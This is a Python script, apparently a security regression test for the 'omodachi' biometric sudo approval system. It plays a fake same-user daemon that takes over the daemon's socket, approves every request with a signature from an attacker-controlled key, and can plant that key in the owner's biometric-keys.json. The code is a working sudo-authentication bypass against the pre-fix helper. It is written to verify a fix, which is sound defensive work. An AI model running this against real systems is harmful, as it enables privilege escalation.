#!/usr/bin/env python3
"""RELEASE-9 B1: the attack the old helper fell to, run as the owner, no password.

Anything running as the owner can stop omodachid and bind its socket, because
`/run/omodachi/<uid>` is the owner's own directory. Before RELEASE-9 the root
helper then believed whatever that socket said. This program is that attacker,
with every advantage a same-user process has:

* it answers `"approved": true`, echoes the approval id it was handed, names a
  device root enrolled, and attaches a signature;
* the signature is made with a key the attacker controls, which it also writes
  into the owner's own `biometric-keys.json` for that device id (the file the
  old daemon verified against) - `--plant-key` does that first.

With the RELEASE-9 helper every one of these must end at the password prompt.
Run it as the owner, e.g. `python3 fake_daemon_attack.py --socket /run/omodachi/1000/omodachid.sock`,
then `sudo -k; sudo -S true </dev/null` in another shell.
"""
from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
from pathlib import Path
import secrets
import socket

_P = 0xFFFFFFFF00000001000000000000000000000000FFFFFFFFFFFFFFFFFFFFFFFF
_N = 0xFFFFFFFF00000000FFFFFFFFFFFFFFFFBCE6FAADA7179E84F3B9CAC2FC632551
_G = (0x6B17D1F2E12C4247F8BCE6E563A440F277037D812DEB33A0F4A13945D898C296,
      0x4FE342E2FE1A7F9B8EE7EB4A7C0F9E162BCE33576B315ECECBB6406837BF51F5)


def _add(a, b):
    if a is None:
        return b
    if b is None:
        return a
    (x1, y1), (x2, y2) = a, b
    if x1 == x2:
        if (y1 + y2) % _P == 0:
            return None
        m = (3 * x1 * x1 - 3) * pow(2 * y1, _P - 2, _P) % _P
    else:
        m = (y2 - y1) * pow(x2 - x1, _P - 2, _P) % _P
    x3 = (m * m - x1 - x2) % _P
    return x3, (m * (x1 - x3) - y1) % _P


def _mul(k, point):
    result = None
    while k:
        if k & 1:
            result = _add(result, point)
        point = _add(point, point)
        k >>= 1
    return result


def _der(r, s):
    def integer(value):
        raw = value.to_bytes((value.bit_length() + 8) // 8, "big")
        return b"\x02" + bytes([len(raw)]) + raw
    body = integer(r) + integer(s)
    return b"\x30" + bytes([len(body)]) + body


def sign(private, message):
    digest = int.from_bytes(hashlib.sha256(message).digest(), "big")
    while True:
        k = secrets.randbelow(_N - 1) + 1
        r = _mul(k, _G)[0] % _N
        s = pow(k, _N - 2, _N) * (digest + r * private) % _N
        if r and s:
            return _der(r, s)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--socket", required=True)
    parser.add_argument("--device-id", help="claim to be this (root-enrolled) device")
    parser.add_argument("--plant-key", metavar="CONFIG_DIR",
                        help="also overwrite that device's key in CONFIG_DIR/biometric-keys.json")
    parser.add_argument("--once", action="store_true")
    args = parser.parse_args()

    private = secrets.randbelow(_N - 1) + 1
    x, y = _mul(private, _G)
    public = b"\x04" + x.to_bytes(32, "big") + y.to_bytes(32, "big")
    if args.plant_key and args.device_id:
        path = Path(args.plant_key) / "biometric-keys.json"
        data = json.loads(path.read_text()) if path.exists() else {"version": 1, "keys": {}}
        data["keys"][args.device_id] = {**data["keys"].get(args.device_id, {}),
                                        "public_key": base64.b64encode(public).decode(),
                                        "label": "planted", "enabled": True, "enrolled_at": 0,
                                        "secure_enclave": False, "algorithm": "ecdsa-p256-sha256"}
        path.write_text(json.dumps(data))
        print(json.dumps({"planted": str(path), "device_id": args.device_id}), flush=True)

    try:
        os.unlink(args.socket)
    except FileNotFoundError:
        pass
    server = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    server.bind(args.socket)
    os.chmod(args.socket, 0o600)
    server.listen(4)
    print(json.dumps({"listening": args.socket}), flush=True)
    while True:
        connection, _ = server.accept()
        with connection:
            request = json.loads(connection.recv(65536).split(b"\n")[0])
            devices = sorted(request.get("devices") or {})
            device_id = args.device_id or (devices[0] if devices else "ipad")
            message = "\n".join(["omodachi-auth-approval-v1", request.get("host_id") or "0" * 32,
                                 request.get("approval_id") or "appr_" + "0" * 32,
                                 request.get("nonce") or "n" * 43, request.get("service") or "sudo",
                                 request.get("user") or "root", device_id]) + "\n"
            reply = {"ok": True, "result": {
                "approved": True, "outcome": "approved", "approval_id": request.get("approval_id"),
                "device_id": device_id, "device_name": "attacker",
                "signature": base64.b64encode(sign(private, message.encode())).decode()}}
            connection.sendall((json.dumps(reply) + "\n").encode())
            print(json.dumps({"asked": {k: request.get(k) for k in ("service", "user", "approval_id")},
                              "answered_as": device_id}), flush=True)
        if args.once:
            return


if __name__ == "__main__":
    main()
